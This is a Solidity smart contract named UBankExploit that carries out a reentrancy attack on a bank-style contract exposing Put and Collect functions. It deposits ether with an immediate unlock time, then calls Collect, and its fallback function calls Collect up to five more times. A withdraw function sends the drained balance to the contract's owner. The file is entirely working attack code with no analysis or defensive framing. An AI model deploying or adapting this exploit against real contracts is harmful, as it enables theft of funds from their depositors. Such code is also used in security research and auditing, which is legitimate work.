pragma solidity ^0.4.25;

interface IVulnerableBank {
    function Put(uint _unlockTime) external payable;
    function Collect(uint _am) external;
}

contract UBankExploit {
    IVulnerableBank public target;
    address public owner;
    uint public count;

    constructor(address _target) public {
        target = IVulnerableBank(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 2 ether, "Need at least 2 ether to attack");
        // Deposit with unlockTime = now, so funds can be immediately withdrawn
        target.Put.value(msg.value)(now);
        // Start the attack
        target.Collect(1 ether);
    }

    // fallback will be triggered during reentrancy
    function () external payable {
        if (count < 5) { // limit reentrancy depth
            count++;
            target.Collect(1 ether);
        }
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}

